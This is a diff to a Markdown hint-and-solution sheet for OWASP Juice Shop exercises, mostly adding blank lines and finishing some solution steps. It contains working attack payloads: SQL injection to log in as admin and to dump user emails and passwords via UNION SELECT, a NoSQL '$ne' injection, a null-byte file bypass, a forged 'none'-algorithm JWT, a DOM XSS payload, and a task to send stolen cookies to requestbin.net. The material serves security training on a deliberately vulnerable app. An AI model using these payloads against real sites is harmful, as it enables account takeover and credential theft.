@@ -10,12 +10,14 @@ Give a devestating zero-start feedback to the store. You find the feedback form 
 
 <details>
   <summary>❓ Hint 1</summary>
+
 Can you enable the button with the developer tools?
 
 </details>
 
 <details>
   <summary>❓ Hint 2</summary>
+
 There is another way: Use ZAP to find the request and replay it with a 0 value.
     
 </details>
@@ -53,12 +55,16 @@ Place an order that makes you rich.
 
 <details>
   <summary>❓ Hint 1</summary>
+
 When you order an item, you pay money. When you sell an item, you are being paid. Basic economics.
+
 </details>
 
 <details>
   <summary>❓ Hint 2</summary>
+
 Have you tried ordering a negative amount of items?
+
 </details>
 
 <details>
@@ -87,8 +93,10 @@ Reading the about us (`/#/about`) might nudge you in the right direction.
 
 <details>
   <summary>❓ Hint 1</summary>
+
 Robots are certainly disallowed to access confidential files.
 How would you tell google to hide a directory?
+
 </details>
 
 <details>
@@ -120,7 +128,9 @@ You need some inspiration on what to buy. View another user's shopping basket.
 
 <details>
   <summary>❓ Hint 1</summary>
+
 Observe the HTTP traffic using ZAP when shopping. Is there a request with an interesting parameter that you could change in your favor?
+
 </details>
 
 <details>
@@ -143,7 +153,9 @@ Privacy is important. Post a product review as another user or edit any user's e
 
 <details>
   <summary>❓ Hint 1</summary>
+
 Observe the HTTP traffic using ZAP while submitting a review for the "Apple Juice". Can you alter any interesting parameters when sending a request to `/rest/products/1/reviews`?
+
 </details>
 
 <details>
@@ -164,17 +176,23 @@ Sometimes it is boring to be a normal user. Login as the administrator (admin@ju
 
 <details>
   <summary>❓ Hint 1</summary>
+
 User credentials are generally stored in a database, can you perform an injection that results in a positive query reply?
+
 </details>
 
 <details>
   <summary>❓ Hint 2</summary>
+
 The email field is vulnerable.
+
 </details>
 
 <details>
   <summary>❓ Hint 3</summary>
+
 Don't forget to comment out the trash after the injected commands.
+
 </details>
 
 
@@ -220,10 +238,11 @@ which is equivalent to
 SELECT * FROM Users WHERE email = 'admin@juice-sh.op';
 ```
 
+4. Login with `admin@juice-sh.op';--` as email and an arbitrary password.
+
 </details>
 
 
-4. Login with `admin@juice-sh.op';--` as email and an arbitrary password.
 
 
 ## User Credentials
@@ -232,54 +251,72 @@ Data is power. Steal all user credentials by abusing the search functionality.
 
 <details>
   <summary>❓ Hint 0 (the endpoint)</summary>
+
 The vulnerable (legacy) search endpoint is located under the following path `/rest/products/search?q=<SEARCH QUERY>`.
 You can find it by analyzing the traffic when reloading `/#/search?q=`.
+
 </details>
 
 <details>
   <summary>❓ Hint 1</summary>
+
 The endpoint is vulnerable to SQL injections.
 When exploiting a SQL injection, make sure that you know how to properly close the query.
 Start by crafting a simple query that doesn't result in an error (e.g. does `test';--` work, or are there for instance any open brackets left?)
+
 </details>
 
 <details>
   <summary>❓ Hint 2</summary>
+
 Exploit the SQLi by crafting an `UNION SELECT` query to join the data from another table to the results. Try to find out how many columns are necessary!
+
 </details>
 
 <details>
   <summary>❓ Hint 3</summary>
+
 Use the `sqlite_schema` table to extract the relevant table names.
+
 </details>
 
 <details>
   <summary>❓ Hint 4</summary>
+
 Use the `PRAGMA_TABLE_INFO('TABLE NAME GOES HERE')` table to extract the relevant column names.
+
 </details>
 
 <details>
 <summary>📚 Solution</summary>
+
 1. When analyzing `/#/search?q=juice` you will probably notice that it is a client-side implemented search, but we are looking for a server-side search to exploit an injection vulnerability.
 By analyzing and playing around you can find the legacy server-side search by reloading the `/#/search?q=` endpoint: `/rest/products/search?q=<SEARCH QUERY>`
 2. As in the <a href="#login-admin">Login Admin</a> exercise, we first try to provoke an error. Some text with a quote is always a good start: `juice'`
 3. Indeed, we get an error. However, this time the error is less revealing as previously. In that case, one generally tries to fix the query by starting a comment: `juice'--`
 4. This results in a "incomplete input" error, which indicates that some bracket might be open. After some trail and error, one discovers that two parenthesis are needed to complete the query: `juice'))--`
 5. Now the fun begins, we want to craft an `UNION SELECT` query to read out the credentials. In a first step we assess the number of columns by trail and error. 9 seems to be the number:
+
 ```
 /rest/products/search?q=juice%27))%20UNION%20SELECT%201,2,3,4,5,6,7,8,9;--
 ```
+
 6. In the next step, we have to find the table name for the user credentials. This can be done by guessing or by reading the `sqlite_schema` table.
+
 ```
 /rest/products/search?q=juice%27))%20UNION%20SELECT%20name,2,3,4,5,6,7,8,9 from sqlite_schema;--
 ```
+
 The table `Users` is the most likely to contain the user credentials.
 7. Now, we need to know the column names, once again we can guess or use a sqlite feature to determine the relevant names.
+
 ```
 /rest/products/search?q=juice%27))%20UNION%20SELECT%20name,2,3,4,5,6,7,8,9 from PRAGMA_TABLE_INFO('Users');--
 ```
+
 The columns `email` and `password` appear to be what we are looking for.
 8. At this point, we have all we need to query the user credentials:
+
 ```
 /rest/products/search?q=juice%27))%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9 from Users;--
 ```
@@ -312,6 +349,7 @@ module.exports = function productReviews () {
 
 <details>
   <summary>❓ Hint 1</summary>
+
 Read the documentation of
 <a href="https://www.mongodb.com/docs/manual/reference/method/db.collection.update/">`db.collection.update` documentation</a>
 and the <a href="https://www.mongodb.com/docs/manual/reference/operator/query/">query operators documentation</a>.
@@ -331,6 +369,7 @@ Edit the request and send the following PATCH request
 ```
 {"id":{"$ne":-1},"message":"would not buy again"}
 ```
+
 </details>
 
 
@@ -341,14 +380,18 @@ Note node.js handles null-bytes differently than the underlying library which is
 
 <details>
   <summary>❓ Hint 1</summary>
+
 In C strings are terminated by a NULL byte.
 Thus the string "hello.txt■.md" (with ■ representing the NULL byte) will be seen as "hello.txt■.md" in node.js, but as "hello.txt" in the low level library that opens the file.
 How can this be exploited, when the access verification happens in node.js?
+
 </details>
 
 <details>
   <summary>❓ Hint 2</summary>
+
 A url encoded null byte is represented as "%00", however, make sure you properly encode it when submitting the request.
+
 </details>
 
 <details>
@@ -418,22 +461,29 @@ Forge an essentially unsigned JWT that impersonates the (non-existing) user jwtn
 
 <details>
   <summary>❓ Hint 1</summary>
+
 Exploit a weird option, that is available when signing tokens with JWT.
+
 </details>
 
 <details>
   <summary>❓ Hint 2</summary>
+
 The weird option is the none algorithm ;)
+
 </details>
 
 
 <details>
   <summary>📚 Solution</summary>
 
-1. Decode the JWT from 
-2. Replace the `alg` value to none and remove the signature.
-3. Update the email claim with jwtn3d@juice-sh.op.
-4. Encode the
+1. Decode the JWT as in the previous exercise
+2. Replace the `alg` value to none and remove the signature
+3. Update the email claim with jwtn3d@juice-sh.op
+4. Encode the JWT
+5. Send a request to the juice shop with the created JWT
+
+This can be easily achieved with the JWT attacker: https://jwt-attacker.onrender.com
 
 </details>
 
@@ -444,7 +494,9 @@ Perform a DOM XSS attack with the following payload: `<iframe src="javascript:al
 
 <details>
   <summary>❓ Hint 1</summary>
+
 Did you try searching?
+
 </details>
 
 
@@ -459,12 +511,16 @@ Can you extract the cookies and send it to you (https://requestbin.net/ might be
 
 <details>
   <summary>❓ Hint 1</summary>
+
 What information is displayed to the admin? When can you set it?
+
 </details>
 
 <details>
   <summary>❓ Hint 2</summary>
+
 When registering a new user the endpoint `/api/Users` is contacted. This looks interesting...
+
 </details>
 
 <details>
